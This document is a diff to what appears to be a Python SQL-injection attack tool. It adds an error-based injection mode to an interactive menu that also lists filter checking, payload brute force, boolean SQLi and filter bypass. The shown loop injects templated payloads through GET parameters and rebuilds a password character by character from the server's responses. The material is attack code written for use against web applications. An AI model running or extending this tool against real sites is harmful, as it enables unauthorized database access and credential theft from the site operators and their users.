@@ -86,7 +86,7 @@ def Get_Error_based(p):
         for j in char:
             pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "")
             get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")
-            print( get.url , get.status_code)
+            #print( get.url , get.status_code)
             if (sp in get.text):
                 print(len(get.text), pw[2:], get.url)
                 password = password + j
@@ -145,7 +145,8 @@ while(True):
         print("1.Check filter")
         print("2.Easy payload brute force")
         print("3.Boolean sql")
-        print("4.Your payload + filter bypass ")
+        print("4.Error based sql")
+        print("5.Your payload + filter bypass ")
         choose_get = int(input("choose : "))
         if choose_get == 1 :
             Filter(p , list_filter)
@@ -154,6 +155,8 @@ while(True):
         elif choose_get == 3:
             Get_Boolean(p)
         elif choose_get == 4:
+            Get_Error_based(p)
+        elif choose_get == 5:
             Get_Filter(list_filter)
     elif choose == 2: # khoi tao data
         c = int(input("How many data : "))
